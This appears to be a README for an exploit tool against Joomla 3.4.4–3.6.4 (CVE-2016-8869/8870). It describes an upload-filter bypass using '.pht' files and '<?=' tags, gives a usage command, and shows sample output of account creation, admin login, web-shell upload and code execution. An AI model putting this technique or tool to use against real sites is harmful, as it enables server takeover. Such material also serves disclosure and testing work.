# Exploit for Joomla 3.4.4 - 3.6.4 (CVE-2016-8869 and CVE-2016-8870) with File Upload web shell

While analysing the recent Joomla exploit in `com_users:user.register` we came across a problem with the upload whitelisting. They don't allow files containing `<?php`, or with the extensions `.php` and `.phtml`, but they do allow `<?=` and `.pht` files, which works out of the box on most hosting environments, including the standard Ubuntu LAMP install, as per:

```
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

## Usage

Choose the username, password and e-mail address to use and point it at the URL for your Joomla website. Use the `-x` and `-s` options to customise exploit behaviour, `-s` searches for the given string in the output after running the PHP file (specified in `-x`), an example is provided which proves remote code execution.

```
$ ./joomraa.py -u hacker -p password -e hacker@example.com http://localhost:8080/joomla 
                                                                                                                    
     @@@   @@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@    @@@@@@    @@@@@@   @@@  
     @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  
     @@!  @@!  @@@  @@!  @@@  @@! @@! @@!  @@!  @@@  @@!  @@@  @@!  @@@  @@!  
     !@!  !@!  @!@  !@!  @!@  !@! !@! !@!  !@!  @!@  !@!  @!@  !@!  @!@  !@   
     !!@  @!@  !@!  @!@  !@!  @!! !!@ @!@  @!@!!@!   @!@!@!@!  @!@!@!@!  @!@  
     !!!  !@!  !!!  !@!  !!!  !@!   ! !@!  !!@!@!    !!!@!!!!  !!!@!!!!  !!!  
     !!:  !!:  !!!  !!:  !!!  !!:     !!:  !!: :!!   !!:  !!!  !!:  !!!       
!!:  :!:  :!:  !:!  :!:  !:!  :!:     :!:  :!:  !:!  :!:  !:!  :!:  !:!  :!:  
::: : ::  ::::: ::  ::::: ::  :::     ::   ::   :::  ::   :::  ::   :::   ::  
 : :::     : :  :    : :  :    :      :     :   : :   :   : :   :   : :  :::  

[-] Getting token
[-] Creating user account
[-] Getting token for admin login
[-] Logging in to admin
[+] Admin Login Success!
[+] Getting media options
[+] Setting media options
[*] Uploading exploit.pht
[*] Uploading exploit to: http://localhost:8080/joomla/images/OGBUHCF5F.pht
[*] Calling exploit
[$] Exploit Successful!
[*] SUCCESS: http://localhost:8080/joomla
```

## Licence

Licenced under the [WTFPL][wtfpl]

[wtfpl]: http://www.wtfpl.net/
